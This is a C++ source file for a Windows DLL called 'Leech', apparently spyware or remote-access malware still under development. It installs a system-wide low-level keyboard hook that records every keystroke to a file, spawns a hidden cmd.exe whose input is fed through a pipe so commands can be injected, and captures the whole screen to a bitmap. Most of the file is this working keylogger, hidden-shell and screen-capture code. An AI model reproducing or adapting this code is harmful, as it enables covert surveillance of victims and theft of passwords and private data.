#include "Leech.h"
#include "PTKeyboard.h"
using namespace std;


BOOL WINAPI DllMain(_In_  HINSTANCE hinstDLL,_In_  DWORD fdwReason,_In_  LPVOID lpvReserved)
{
	globalInstance = hinstDLL;
	cout << "DLLMAIN" <<endl;
	return TRUE;
	//load library shared resources?
}

//Function responsible for decoding key codes
char decodeKeyAndWrite(LPARAM lParam, SHORT lShiftState,SHORT rShiftState,SHORT rAltState){

	DWORD s = ((KBDLLHOOKSTRUCT*) lParam)->vkCode;

	//Are the shift keys pressed?
	if((lShiftState & 0x8000) || (rShiftState & 0x8000))//&????
	{
		if ((s == VK_LSHIFT) || (s == VK_RSHIFT))
			return '\0';

		if((s >= 0x30) && (s <= 0x39))
			return shiftedNum[s - 0x30];
		else if((s >= 0x41) && (s <=0x5A))
			return MapVirtualKey(s,MAPVK_VK_TO_CHAR);
		else if(s == VK_OEM_PLUS)
			return shiftedPlus;
		else if(s == VK_OEM_MINUS)
			return shiftedDash;
		else if(s == VK_OEM_PERIOD)
			return shiftedPeriod;
		else if (s== VK_OEM_COMMA)
			return shiftedComma;
		else if (s == VK_OEM_2)
			return shiftedTilde;
		else if (s == VK_OEM_7)
			return 'ª';
		else if (s == VK_OEM_1)
			return shiftedAccent;
		else if (s == VK_OEM_4)
			return shiftedStem;
		else if (s == VK_OEM_6)
			return shiftedQuote;
		else if (s ==VK_OEM_5)
			return shiftedBackSlash;
		else return'\0'; //sem return nao bufa???WTF???
	}

	//Is the right Alt pressed?
	else if (rAltState & 0x8000)
	{
		if (s == VK_RMENU) 
			return '\0';

		if((s >= 0x30) && (s <= 0x39))
			return rightAltNum[s - 0x30];
		else return '\0';
	}
	
	//Not special characters. We assume a direct mapping
    else if(((s >= 0x30) && (s <=0x39)) || ((s >= 0x41) && (s <=0x5A)) || ((s >=0xBA)&&(s <=0xC0)) || (s == VK_OEM_7) || (s == VK_OEM_5))
		return tolower(MapVirtualKey(s,MAPVK_VK_TO_CHAR));
	//c++ não verifica returns que nao calhem em nenhuma das codições acima.
	
	//Not a printable/valid key.
	else return '\0';

}

//Hook function
LRESULT  CALLBACK LowLevelKeyboardProc( int nCode, WPARAM wParam, LPARAM lParam){

	//to do: detect symbols and not capps. detect the calling process getkeyboardfocus. vamos ter o mesmo problema de varias apps
	
	//The documentation says that if the nCode<0, we must not process and should call the next hook
	//if (nCode < 0)
		//return CallNextHookEx(NULL, nCode, _In_ wParam, lParam);

	//used to avoid multiple writes when pressing a key for much time.
	if((wParam != WM_KEYDOWN) && (wParam != WM_SYSKEYDOWN))
		return CallNextHookEx(NULL, nCode,  wParam, lParam);

	char decodedChar = decodeKeyAndWrite(lParam,GetKeyState(VK_LSHIFT),GetKeyState(VK_RSHIFT),GetKeyState(VK_RMENU));

	if(decodedChar != '\0')
	{
		fopen_s(&output,(const char*)&path,"a"); //open in appending mode
		fwrite(&decodedChar,sizeof(decodedChar),sizeof(decodedChar),output);
		fclose(output);
	}
	return CallNextHookEx(NULL, nCode,  wParam, lParam);
}

//launch hook
void setHook(){
	
	MSG message;
	keyLoggerHook = SetWindowsHookEx(WH_KEYBOARD_LL, (HOOKPROC)LowLevelKeyboardProc ,globalInstance, 0);
	
	if (keyLoggerHook != NULL)
			cout << "Hook is set!!!" << endl;

	//check why is this, later
	while(GetMessage(&message, NULL, 0, 0) > 0)
	{
		TranslateMessage(&message);
		DispatchMessage(&message);
	}
}

void unsetHook(){

	BOOL status = UnhookWindowsHookEx(keyLoggerHook);
	if(status == 0)
		cout << "There has been an error unsetting hook!!" << endl;

}

void launchCmd(){

	DWORD procStatus;	
	BOOL exitSt = GetExitCodeProcess(procInfo.hProcess,&procStatus);

			if(procStatus == STILL_ACTIVE){
				cout <<"The console is alive!\n"<< endl;
				return;
			}
	//Security attributes related to pipes. It's used essentially to allow pipe handlers inheritance by the new process
	SECURITY_ATTRIBUTES saAttr; 
	saAttr.nLength = sizeof(saAttr); 
	saAttr.bInheritHandle = TRUE;	//handles inheritable by child processes
	saAttr.lpSecurityDescriptor = NULL; 
	
	//PHANDLE nao é aceite. tem de ser &Handle. WTF???
	if(!(CreatePipe(&childReadEnd, &parentWriteEnd, &saAttr,0) == 0))	
		printf("Pipe Parent -> Child created with success!!\n");

	//if(!(CreatePipe(&parentReadEnd, &childWriteEnd, &saAttr,0) == 0))	
		//printf("Pipe Child -> Parent created with success!!\n");

	//Structure used by CreateProcess to add handles to the new process
	ZeroMemory(&procInfo, sizeof(procInfo));
	TCHAR szCmdline[]=TEXT("C:\\Windows\\system32\\cmd.exe");
	//TCHAR szCmdline[]=TEXT("C:\\Users\\root\\Documents\\Visual Studio 2012\\Projects\\Leech\\Release\\ChildApp.exe");

	//Structures responsible for new process characteristics. Essentially for pipes setting.
	STARTUPINFO stInfo;
	ZeroMemory( &stInfo, sizeof(stInfo));
	stInfo.cb = sizeof(STARTUPINFO);
	stInfo.wShowWindow = SW_HIDE; //launch hidden cmd
	//stInfo.hStdError = childWriteEnd;
	//stInfo.hStdOutput = childWriteEnd;
	stInfo.hStdInput = childReadEnd;
	stInfo.dwFlags |= (STARTF_USESTDHANDLES | STARTF_USESHOWWINDOW); //our structure changes stream and windows behaviour

	BOOL retState = CreateProcess(szCmdline, NULL, NULL, NULL,TRUE, CREATE_NEW_CONSOLE , NULL,NULL, &stInfo, &procInfo);
	//BOOL retState = CreateProcess(szCmdline, NULL, NULL, NULL,TRUE, CREATE_NEW_CONSOLE , NULL,NULL, &stInfo, &procInfo);

	if(!retState)
		printf("Process creation failed!\n");

}

void killCmd(){

	DWORD procStatus;	
		BOOL exitSt = GetExitCodeProcess(procInfo.hProcess,&procStatus);

			if(procStatus != STILL_ACTIVE){
				cout <<"The console is dead!\n"<< endl;
				return;
			}

	HANDLE procHandle = procInfo.hProcess;

	//CloseHandle(parentReadEnd);
	CloseHandle(parentWriteEnd);
	CloseHandle(childReadEnd);
	//CloseHandle(childWriteEnd);

	BOOL retStatus = TerminateProcess(procInfo.hProcess, 0);

	if(retStatus == 0)
		printf("Process termination failed!\n");

}

void cmdExec(char* cmd){
//char* cmdExec(char* cmd){
	cout << cmd << endl;
		//experimentar escrever em dir-> 4 caracteres dir \r\n\0 Se MOre? problema com \0 se nao zerar na proxima chamada manda o mesmo LOL
	char answer[200000] = {'\0'};

		DWORD procStatus;	
		BOOL exitSt = GetExitCodeProcess(procInfo.hProcess,&procStatus);

			if(procStatus != STILL_ACTIVE){
				cout <<"The console is dead!\n"<< endl;
				return;
			}
			if(exitSt == 0)
				cout << "The process check failed!\n" << endl;

	ZeroMemory(answer, sizeof(answer));


	DWORD writeCounter = 0;
	WriteFile(parentWriteEnd, cmd, strlen(cmd),&writeCounter,NULL);
	DWORD readCounter = 0;
	DWORD toBeRead = 0;
	char* updatedIndex = answer;

	readCounter = 0;
	toBeRead = 0;
	int consecutiveTries = 0;

	//for(DWORD tries = 0;tries < 90000000;tries++){
		//PeekNamedPipe(parentReadEnd,updatedIndex,sizeof(answer) - readCounter,&readCounter,&toBeRead,0);
		//if(consecutiveTries >= 10000000)
			//break;
		//if(toBeRead != 0){
			//ReadFile(parentReadEnd,updatedIndex,toBeRead,&readCounter,NULL);
			//updatedIndex += readCounter;
		//	consecutiveTries = 0;
		//}
//		else consecutiveTries++;

	//}


	/*for(DWORD tries = 0;tries < 1000000;tries++){	
		if(consecutiveTries >= 5)
			break;
		Sleep(5000);
		PeekNamedPipe(parentReadEnd,updatedIndex,sizeof(answer) - readCounter,&readCounter,&toBeRead,0);
		if(toBeRead != 0){
		 ReadFile(parentReadEnd,updatedIndex,toBeRead,&readCounter,NULL);
		 updatedIndex += readCounter;
		 consecutiveTries = 0;
		}
		else consecutiveTries++;

	}*/

	return;
	//return answer;
	
	
}



string convertInt(int number)
{
   stringstream ss;//create a stringstream
   ss << number;//add number to the stream
   return ss.str();//return a string with the contents of the stream
}

LPWSTR ConvertToLPWSTR( const std::string& s )
{
		  LPWSTR ws = new wchar_t[s.size()+1]; // +1 for zero at the end
		  copy( s.begin(), s.end(), ws );
		  ws[s.size()] = 0; // zero at the end
		  return ws;
}

HANDLE createFile(const std::string& param)
{
			return CreateFile(ConvertToLPWSTR(param),
	        GENERIC_WRITE,
	        0,
	        NULL,
	        CREATE_ALWAYS,
	        FILE_ATTRIBUTE_NORMAL, NULL); 
		
}


void captureAnImage()
{


		HDC hScreenDC = CreateDC(L"DISPLAY", NULL, NULL, NULL);
		HDC hMemoryDC = CreateCompatibleDC(hScreenDC);

		int x = GetDeviceCaps(hScreenDC, HORZRES);
		int y = GetDeviceCaps(hScreenDC, VERTRES);

		HBITMAP hBitmap = CreateCompatibleBitmap(hScreenDC, x, y);

		HBITMAP hOldBitmap = (HBITMAP)SelectObject(hMemoryDC, hBitmap);      

		BitBlt(hMemoryDC, 0, 0, x, y, hScreenDC, 0, 0, SRCCOPY);
		HBITMAP hbmScreen = NULL;
		hbmScreen = (HBITMAP)SelectObject(hMemoryDC, hOldBitmap);               

	    BITMAP bmpScreen;

	    // Get the BITMAP from the HBITMAP
	    GetObject(hbmScreen,sizeof(BITMAP),&bmpScreen);
	     
	    BITMAPFILEHEADER   bmfHeader;    
	    BITMAPINFOHEADER   bi;
	     
	    bi.biSize = sizeof(BITMAPINFOHEADER);    
	    bi.biWidth = bmpScreen.bmWidth;    
	    bi.biHeight = bmpScreen.bmHeight;  
	    bi.biPlanes = 1;    
	    bi.biBitCount = 32;    
	    bi.biCompression = BI_RGB;    
	    bi.biSizeImage = 0;  
	    bi.biXPelsPerMeter = 0;    
	    bi.biYPelsPerMeter = 0;    
	    bi.biClrUsed = 0;    
	    bi.biClrImportant = 0;

	    DWORD dwBmpSize = ((bmpScreen.bmWidth * bi.biBitCount + 31) / 32) * 4 * bmpScreen.bmHeight;

	    // Starting with 32-bit Windows, GlobalAlloc and LocalAlloc are implemented as wrapper functions that 
	    // call HeapAlloc using a handle to the process's default heap. Therefore, GlobalAlloc and LocalAlloc 
	    // have greater overhead than HeapAlloc.
	    HANDLE hDIB = GlobalAlloc(GHND,dwBmpSize); 
	    char *lpbitmap = (char *)GlobalLock(hDIB);    

	    // Gets the "bits" from the bitmap and copies them into a buffer 
	    // which is pointed to by lpbitmap.
	    GetDIBits(hMemoryDC, hbmScreen, 0,
	        (UINT)bmpScreen.bmHeight,
	        lpbitmap,
	        (BITMAPINFO *)&bi, DIB_RGB_COLORS);
		
			
			
	    // A file is created, this is where we will save the screen capture.
		
	
		//std::string file ("capture");
		//std::string index  = convertInt(i);
		//std::string extension (".bmp");
		//std::string filename = file + index + extension;


		HANDLE hFile = createFile("capture.bmp");

	  	//i++;
	  	
	    // Add the size of the headers to the size of the bitmap to get the total file size
	    DWORD dwSizeofDIB = dwBmpSize + sizeof(BITMAPFILEHEADER) + sizeof(BITMAPINFOHEADER);
	 
	    //Offset to where the actual bitmap bits start.
	    bmfHeader.bfOffBits = (DWORD)sizeof(BITMAPFILEHEADER) + (DWORD)sizeof(BITMAPINFOHEADER); 
	    
	    //Size of the file
	    bmfHeader.bfSize = dwSizeofDIB; 
	    
	    //bfType must always be BM for Bitmaps
	    bmfHeader.bfType = 0x4D42; //BM   
	 
	    DWORD dwBytesWritten = 0;
	    WriteFile(hFile, (LPSTR)&bmfHeader, sizeof(BITMAPFILEHEADER), &dwBytesWritten, NULL);
	    WriteFile(hFile, (LPSTR)&bi, sizeof(BITMAPINFOHEADER), &dwBytesWritten, NULL);
	    WriteFile(hFile, (LPSTR)lpbitmap, dwBmpSize, &dwBytesWritten, NULL);
	    //Unlock and Free the DIB from the heap
	    GlobalUnlock(hDIB);    
	    GlobalFree(hDIB);

	    //Close the handle for the file that was created
	    CloseHandle(hFile);
	       
	    //Clean up
	
	    DeleteObject(hbmScreen);
		DeleteDC(hMemoryDC);
		DeleteDC(hScreenDC);
}